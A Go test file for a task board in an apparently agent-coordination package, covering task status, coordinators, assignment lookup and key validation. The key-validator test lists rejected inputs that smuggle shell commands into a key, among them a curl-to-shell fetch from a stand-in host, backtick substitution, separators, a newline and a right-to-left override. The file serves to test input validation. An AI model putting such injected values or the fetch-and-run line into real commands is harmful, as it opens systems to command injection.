package agentcomm

import (
	"strings"
	"testing"
)

func TestBoardTaskStatus(t *testing.T) {
	as := func(states ...AssignmentState) []BoardTaskAssignment {
		var out []BoardTaskAssignment
		for _, s := range states {
			out = append(out, BoardTaskAssignment{State: s})
		}
		return out
	}
	tests := []struct {
		name string
		task BoardTask
		want BoardTaskStatus
	}{
		{"no assignments", BoardTask{}, BoardTaskTodo},
		{"all assigned", BoardTask{Assignments: as(AssignmentAssigned, AssignmentAssigned)}, BoardTaskTodo},
		{"assigned and in progress", BoardTask{Assignments: as(AssignmentAssigned, AssignmentInProgress)}, BoardTaskInProgress},
		{"done and assigned", BoardTask{Assignments: as(AssignmentDone, AssignmentAssigned)}, BoardTaskInProgress},
		{"all done", BoardTask{Assignments: as(AssignmentDone, AssignmentDone)}, BoardTaskDone},
		{"only done history", BoardTask{History: as(AssignmentDone)}, BoardTaskTodo},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.task.Status(); got != tt.want {
				t.Fatalf("Status() = %q, want %q", got, tt.want)
			}
			if got := ViewOf(tt.task).Status; got != tt.want {
				t.Fatalf("ViewOf().Status = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestBoardTaskCoordinator(t *testing.T) {
	tests := []struct {
		name string
		task BoardTask
		want ParticipantID
	}{
		{"agent author", BoardTask{AuthorID: "p1"}, "p1"},
		{"user author", BoardTask{AuthorID: UserParticipantID}, ""},
		{"explicit coordinator", BoardTask{AuthorID: UserParticipantID, CoordinatorID: "p2"}, "p2"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.task.Coordinator(); got != tt.want {
				t.Fatalf("Coordinator() = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestBoardTaskAssignmentLookup(t *testing.T) {
	task := BoardTask{
		Assignments: []BoardTaskAssignment{{ID: "a1", ParticipantID: "p1"}},
		History:     []BoardTaskAssignment{{ID: "a0", ParticipantID: "p2", Ended: AssignmentReleased}},
	}
	if a, ok := task.Assignment("a1"); !ok || a.ParticipantID != "p1" {
		t.Fatalf("Assignment(a1) = %+v, %v", a, ok)
	}
	if _, ok := task.Assignment("a0"); ok {
		t.Fatal("Assignment must not return history entries")
	}
	if a, ok := task.EndedAssignment("a0"); !ok || a.ParticipantID != "p2" {
		t.Fatalf("EndedAssignment(a0) = %+v, %v", a, ok)
	}
	if _, ok := task.EndedAssignment("a1"); ok {
		t.Fatal("EndedAssignment must not return active entries")
	}
	if a, ok := task.ActiveFor("p1"); !ok || a.ID != "a1" {
		t.Fatalf("ActiveFor(p1) = %+v, %v", a, ok)
	}
	if _, ok := task.ActiveFor("p2"); ok {
		t.Fatal("ActiveFor must ignore history")
	}
}

func TestValidBoardTaskKey(t *testing.T) {
	tests := []struct {
		key  string
		want bool
	}{
		{"task/a", true},
		{"task/", false},
		{"task/a/b", false},
		{"fact/a", false},
		{"task/" + strings.Repeat("a", 195), true},
		{"task/" + strings.Repeat("a", 196), false}, // 201 bytes
		{"task/s1-t2_v1.0", true},
		{"task/логин-форма", true}, // the dashboard makes Cyrillic slugs from titles
		// The key goes into ready-to-run commands in messages: nothing a shell or a line break would act on.
		{"task/x$(curl evil|sh)", false},
		{"task/x`id`", false},
		{"task/a b", false},
		{"task/a;b", false},
		{"task/a'b", false},
		{"task/a\"b", false},
		{"task/a\nb", false},
		{"task/a\x00b", false},
		{"task/a\u202eb", false}, // right-to-left override
	}
	for _, tt := range tests {
		if got := ValidBoardTaskKey(tt.key); got != tt.want {
			t.Errorf("ValidBoardTaskKey(%q) = %v, want %v", tt.key, got, tt.want)
		}
	}
}
